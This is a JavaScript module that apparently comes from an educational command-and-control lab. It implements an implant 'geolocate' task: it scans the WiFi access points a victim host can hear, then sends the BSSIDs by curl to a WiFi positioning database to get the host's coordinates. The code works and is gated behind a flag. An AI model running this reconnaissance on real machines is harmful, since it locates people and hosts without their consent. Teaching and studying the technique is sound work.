// Geolocate task: the classic WiFi positioning attack, demonstrated in two
// stages. Stage 1 scans the BSSIDs the host's radio can hear with OS
// built-in tools; stage 2 resolves them against a WPS database (any
// MLS/Google-compatible endpoint) for coordinates with an accuracy
// estimate. Gated behind enableGeolocate in runTask.
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import crypto from 'node:crypto';
import { execFileSync } from 'node:child_process';

export const GEO_MAX_APS = 20; // keep result tags bounded (~130B/tag)
export const GEO_MAX_SSID_LEN = 32;
export const GEO_HTTP_TIMEOUT_MS = 12_000;
// beaconDB (the key-free MLS successor) requires clients to identify
// themselves; a generic curl UA may be refused.
export const GEO_USER_AGENT = 'kc2-lab/1.0 (educational wifi-positioning demo)';
// Working WPS endpoint as of 2026: no key, MLS/Ichnaea-compatible.
export const GEO_DEFAULT_SERVICE_URL = 'https://api.beacondb.net/v1/geolocate';

const BSSID_RE = /^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$/;
const MACOS_AIRPORT_PATH =
  '/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport';

function cleanSsid(value) {
  return String(value ?? '')
    .replace(/[\r\n]/g, ' ')
    .trim()
    .slice(0, GEO_MAX_SSID_LEN);
}

/** Legacy `airport -s` (removed in macOS 14.4, kept for older lab hosts). */
export function parseAirportScan(text) {
  const aps = [];
  for (const line of String(text).split('\n')) {
    const m = /^(.*?)\s+(([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})\s+(-?\d+)\s/.exec(line);
    if (!m || /^\s*SSID\s/.test(line)) continue;
    aps.push({ bssid: m[2].toLowerCase(), ssid: cleanSsid(m[1]), rssi: Number(m[4]) });
  }
  return aps;
}

/** `system_profiler SPAirPortDataType` — the post-macOS-14.4 fallback. */
export function parseSystemProfilerWifi(text) {
  const aps = [];
  let lastHeader = '';
  for (const line of String(text).split('\n')) {
    const header = /^\s{4,}(\S[^:]*):\s*$/.exec(line);
    if (header) lastHeader = header[1];
    const m = /BSSID:\s*((?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})\s*$/.exec(line);
    if (m) {
      aps.push({ bssid: m[1].toLowerCase(), ssid: cleanSsid(lastHeader), rssi: null });
    }
  }
  return aps;
}

/** `nmcli -t -f BSSID,SSID,SIGNAL dev wifi list` (backslash-escaped fields). */
function splitNmcliLine(line) {
  const parts = [];
  let cur = '';
  for (let i = 0; i < line.length; i++) {
    if (line[i] === '\\' && i + 1 < line.length) {
      cur += line[i + 1];
      i++;
    } else if (line[i] === ':') {
      parts.push(cur);
      cur = '';
    } else {
      cur += line[i];
    }
  }
  parts.push(cur);
  return parts;
}

export function parseNmcliScan(text) {
  const aps = [];
  for (const line of String(text).split('\n')) {
    if (!line.trim()) continue;
    const [bssid, ssid, signal] = splitNmcliLine(line);
    if (!BSSID_RE.test(bssid ?? '')) continue;
    const pct = Number(signal);
    // nmcli reports 0-100 quality; approximate dBm like iwconfig does
    const rssi = Number.isFinite(pct) ? Math.round(pct / 2 - 100) : null;
    aps.push({ bssid: bssid.toLowerCase(), ssid: cleanSsid(ssid), rssi });
  }
  return aps;
}

/** `netsh wlan show networks mode=bssid` on Windows. */
export function parseNetshScan(text) {
  const aps = [];
  let ssid = '';
  for (const line of String(text).split('\n')) {
    const s = /^SSID \d+ : (.*)$/.exec(line);
    if (s) {
      ssid = cleanSsid(s[1]);
      continue;
    }
    const b = /BSSID \d+\s*:\s*((?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})/.exec(line);
    if (b) {
      aps.push({ bssid: b[1].toLowerCase(), ssid, rssi: null });
      continue;
    }
    const sig = /Signal\s*:\s*(\d+)%/.exec(line);
    if (sig && aps.length > 0 && aps[aps.length - 1].rssi === null) {
      aps[aps.length - 1].rssi = Math.round(Number(sig[1]) / 2 - 100);
    }
  }
  return aps;
}

function dedupeAndSortAps(aps) {
  const seen = new Set();
  const out = [];
  for (const ap of aps) {
    if (seen.has(ap.bssid)) continue;
    seen.add(ap.bssid);
    out.push(ap);
  }
  out.sort((a, b) => (b.rssi ?? -127) - (a.rssi ?? -127));
  return out;
}

/**
 * Scan visible WiFi access points with OS built-in tools — stage 1 of the
 * WiFi positioning technique an attacker uses: collect the BSSIDs the
 * victim's radio can hear, since each BSSID is a worldwide index key in
 * wardriving-derived location databases.
 */
export function scanWifiNetworks(platform, exec) {
  const EXEC_OPTS = { encoding: 'utf8', timeout: 25_000, windowsHide: true };
  const errors = [];
  const attempts = [];
  if (platform === 'darwin') {
    attempts.push(
      [MACOS_AIRPORT_PATH, ['-s'], parseAirportScan],
      ['system_profiler', ['SPAirPortDataType'], parseSystemProfilerWifi],
    );
  } else if (platform === 'linux') {
    attempts.push(['nmcli', ['-t', '-f', 'BSSID,SSID,SIGNAL', 'dev', 'wifi', 'list'], parseNmcliScan]);
  } else if (platform === 'win32') {
    attempts.push(['netsh', ['wlan', 'show', 'networks', 'mode=bssid'], parseNetshScan]);
  } else {
    throw new Error(`geolocate is not supported on ${platform}`);
  }
  for (const [file, args, parse] of attempts) {
    try {
      const aps = dedupeAndSortAps(parse(exec(file, args, EXEC_OPTS)));
      if (aps.length > 0) return aps;
      errors.push(`${file}: scan returned no access points (WiFi off, or BSSIDs redacted by OS privacy rules)`);
    } catch (err) {
      errors.push(`${file}: ${err.message.split('\n')[0]}`);
    }
  }
  throw new Error(`WiFi scan failed — ${errors.join('; ')}`);
}

/**
 * Stage 2: resolve the scanned BSSIDs against a WiFi Positioning System
 * (WPS) database. Uses the shared Google/Mozilla "geolocate" request shape,
 * so any MLS-compatible endpoint works (Google Geolocation API, Mozilla
 * Location Service, or a local mock). The request is sent with curl and a
 * temp-file body — nothing is interpolated into a shell.
 */
export function lookupWpsLocation(serviceUrl, serviceKey, aps, exec) {
  // considerIp lets services with sparse WiFi coverage (beaconDB outside
  // mapped areas) fall back to a coarse IP estimate — the response marks it
  // with `fallback`, which is itself a nice classroom contrast.
  const body = {
    considerIp: true,
    wifiAccessPoints: aps.map((ap) => ({
      macAddress: ap.bssid,
      ...(ap.rssi !== null ? { signalStrength: ap.rssi } : {}),
    })),
  };
  const tmp = path.join(
    fs.realpathSync(os.tmpdir()),
    `kc2-geo-${process.pid}-${crypto.randomBytes(4).toString('hex')}.json`,
  );
  let url = serviceUrl;
  if (serviceKey) url += `${url.includes('?') ? '&' : '?'}key=${encodeURIComponent(serviceKey)}`;
  try {
    fs.writeFileSync(tmp, JSON.stringify(body), { mode: 0o600 });
    const out = exec(
      'curl',
      ['-sS', '-X', 'POST',
        '-H', 'Content-Type: application/json',
        '-H', `User-Agent: ${GEO_USER_AGENT}`,
        '--data-binary', `@${tmp}`, '--max-time', String(Math.ceil(GEO_HTTP_TIMEOUT_MS / 1000)), url],
      { encoding: 'utf8', timeout: GEO_HTTP_TIMEOUT_MS + 5000, windowsHide: true },
    );
    let parsed;
    try {
      parsed = JSON.parse(out);
    } catch {
      throw new Error(`WPS service returned non-JSON: ${out.slice(0, 120)}`);
    }
    if (parsed?.error) {
      const msg = parsed.error.message ?? JSON.stringify(parsed.error).slice(0, 120);
      throw new Error(`WPS service error: ${msg}`);
    }
    const lat = Number(parsed?.location?.lat);
    const lng = Number(parsed?.location?.lng);
    if (!Number.isFinite(lat) || Math.abs(lat) > 90 || !Number.isFinite(lng) || Math.abs(lng) > 180) {
      throw new Error('WPS service returned no valid coordinates');
    }
    const accuracy = Number(parsed?.accuracy);
    return {
      lat,
      lng,
      accuracyM: Number.isFinite(accuracy) && accuracy > 0 ? Math.round(accuracy) : null,
      fallback: typeof parsed?.fallback === 'string' ? parsed.fallback : null,
    };
  } finally {
    fs.rmSync(tmp, { force: true });
  }
}

export const GEOLOCATE_TASKS = {
  /**
   * Demonstrate the classic WiFi positioning attack: the agent scans the
   * BSSIDs its radio can hear (stage 1, reconnaissance), then resolves them
   * against a WPS database for coordinates with an accuracy estimate
   * (stage 2) — the same technique real-world implants use to locate hosts
   * that have no GPS. Stage 2 only runs when the victim operator configures
   * geolocateServiceUrl (any MLS/Google-compatible endpoint, including a
   * local mock); without it the task returns the scan-only artifact, which
   * is itself the teachable output. Gated behind enableGeolocate.
   */
  geolocate(_args = {}, options = {}) {
    const platform = options.platform ?? process.platform;
    const exec = options.execFileSync ?? execFileSync;
    const aps = scanWifiNetworks(platform, exec);
    const used = aps.slice(0, GEO_MAX_APS);
    const serviceUrl = String(options.geolocateServiceUrl ?? '').trim();
    const lines = [];
    if (serviceUrl) {
      const fix = lookupWpsLocation(serviceUrl, String(options.geolocateServiceKey ?? ''), used, exec);
      lines.push('geolocate: wifi-scan + WPS database lookup');
      lines.push(
        `location: lat=${fix.lat} lng=${fix.lng} accuracyM=${fix.accuracyM ?? 'unknown'}`,
      );
      if (fix.fallback) {
        lines.push(`fallback: ${fix.fallback} (coarse estimate — the WiFi BSSIDs were not in the database)`);
      }
      lines.push(`service: ${new URL(serviceUrl).host}`);
    } else {
      lines.push('geolocate: wifi-scan (reconnaissance stage — no WPS lookup configured)');
      lines.push(`set geolocateServiceUrl on the victim (e.g. ${GEO_DEFAULT_SERVICE_URL}) to resolve coordinates`);
    }
    lines.push(`access points (${used.length}${aps.length > used.length ? ` of ${aps.length}` : ''}):`);
    for (const ap of used) {
      lines.push(`  ${ap.bssid}  rssi=${ap.rssi ?? '?'}  ssid="${ap.ssid || '<hidden>'}"`);
    }
    return lines.join('\n');
  },
};
